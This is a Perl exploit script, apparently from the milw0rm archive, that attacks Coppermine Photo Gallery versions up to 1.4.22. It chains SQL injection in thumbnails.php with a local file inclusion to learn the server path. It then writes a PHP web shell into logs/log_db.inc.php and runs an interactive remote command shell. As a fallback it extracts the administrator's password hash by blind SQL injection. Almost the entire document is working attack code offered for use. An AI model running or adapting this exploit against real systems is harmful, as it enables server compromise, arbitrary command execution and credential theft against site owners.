#!/usr/bin/perl
# Coppermine Photo Gallery <= 1.4.22 Remote Exploit
# Need register_globals = on and magic_quotes_gpc = off
# Based on vulnerabilities discussed at http://www.milw0rm.org/exploits/8713
# Coded by girex

use LWP::UserAgent;

if(not defined $ARGV[0])
{
     banner();
     print "[-] Usage: perl $0 [host] [path]\n";
     print "[-] Example: perl $0 localhost /gallery/\n\n";
     exit;
}

my $lwp = new LWP::UserAgent or die;
 
my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];
   $target .= '/' unless $target =~ /^http:\/\/(.?)\/$/;

my $uid = '1';	# Change if need
my @chars  =  ('1'..'9', 'a'..'f'); 
my $injection = '<?php if(isset($_SERVER[HTTP_CMD])) {echo 12345; passthru(stripslashes($_SERVER[HTTP_CMD]));}?>';

banner();
$lwp->default_header('Accept-Language: en-us,en;q=0.5');

my $html = inj_request(' WHERE x');	# Wrong query to obtain an error

if(not defined $html)
{
    print "[-] Request mistake. Exploit terminated!\n";
    exit ();
}
elsif($html =~ /There was an error while processing a database query/)
{
    print "[+] Site vulnerable. Trying to retrieve absolute path...\n";
}
else
{
    print "[-] Site not vulnerable to SQL Injection in thumbnails.php\n";
    print "[-] Maybe magic_quotes = On or register_globals = Off\n";
    end_try();
}

# This LFI includes README.txt that contais php code with phpinfo() function.
my $res = $lwp->get("${target}index.php?GLOBALS[USER][ID]=5b83a5f92603efcdb65d47c9a2991d6b&GLOBALS[USER][lang]=../README.txt%00");

if($res->content =~ /<tr><td class=\"e\">_SERVER\[\"SCRIPT_FILENAME\"\]<\/td><td class=\"v\">(.*)index\.php<\/td><\/tr>/)
{
     $path_to = $1;
}
else
{
    print "[-] Unable to retrieve the absolute path. Problems with LFI.\n";
    end_try();
}

$html = inj_request("AND 1=2 UNION ALL SELECT '${injection}' INTO OUTFILE '${path_to}logs/log_db.inc.php");
my $res = $lwp->get($target.'logs/log_db.inc.php');

if($res->is_success)
{
    print "[+] Shell injected at ${path_to}logs/log_db.inc.php\n\n";
}
else
{
    print "[-] Shell upload failed, MySQL cannot write to logs path!\n\n";
    print "[+] Attempting to retrieve admin's md5..\n";
    blind_sql();

    if(length($hash) != 32)
    {
        print "\n\n[-] Exploit mistake: unable to retrieve admin's md5\n";
    }
    else
    { 
	print "\n";
    }

    end_try();
}
                                                          
while(1)
{
    print "[+] coppermine\@shell:~\$ ";
    chomp(my $cmd = <STDIN>);
    
    end_try() if $cmd eq 'exit';
     
    $lwp->default_header( 'CMD' => $cmd );
    my $res = $lwp->get($target.'logs/log_db.inc.php');
         
    if($res->is_success and $res->content =~ /12345/)
    {
        print "\n". substr($res->content, index($res->content, '12345') + 5)."\n";
    }
    else
    {
        print "[-] Something wrong, command execution failed!\n";
        last;
    }
}




sub inj_request
{
    my $sql = shift;
    my $res = $lwp->get($target. "thumbnails.php?lang=english&album=alpha&GLOBALS[cat]=999'+${sql}");

    if($res->is_success)
    {
	return $res->content;
    }

    return undef;
}

sub blind_sql
{
    our $hash = '';
    my $prefix = get_prefix() or 'cpg14x';
    my $username = get_username() or 'admin';

    $| = 1;
    print "[+] username: ${username} - md5 hash: ";

    for($i = 1; $i <= 32; $i++)
    {
	foreach $char(@chars)
	{
	    $html = inj_request("OR+SUBSTRING((SELECT+user_password+FROM+${prefix}_users+WHERE+user_id=${uid}),${i},1)='${char}'%23");
	
	    if($html =~ /The selected album\/file does not exist/)
	    {
		$hash .= $char;
                syswrite(STDOUT, $char, 1);
		last;
	    }
	}
    
	last if $i != length($hash);
    }   
}

sub get_prefix		# File update.php shows the query executed to update the tables, we can get table prefix from it
{
    my $rv = undef;
    my $res = $lwp->get($target.'update.php');
    
    if($res->is_success and $res->content =~ /CREATE TABLE IF NOT EXISTS (\w+)_sessions/)
    {
	$rv = $1;
    }

    return $rv;
}

sub get_username	
{
    my $rv = undef;
    my $res = $lwp->get($target."profile.php?lang=english&uid=${uid}");

    if($res->content =~ /<td class="tableh1" colspan="2">(.*)'s profile<\/td>/)
    {
	$rv = $1;
    }

    return $rv;
}

sub end_try
{
    my $res = $lwp->get($target.'register.php?lang=english');

    if($res->is_success and $res->content !~ /You don't have permission to access this page/)
    {
        print "\n[+] Target can be vulnerable to SQL Injection for registered users\n";
        print "[+] See http://www.milw0rm.org/exploits/8713 to know how to exploit it!\n\n";
    }
    else
    {
        print "\n[-] The target is NOT vulnerable to the SQL Injection for registered users\n\n";
    }

    exit;
}

sub banner
{
     print "\n[+] Coppermine Photo Gallery <= 1.4.22 Remote Exploit\n";
     print "[+] Coded by girex\n";
     print "\n";
}

# milw0rm.com [2009-05-19]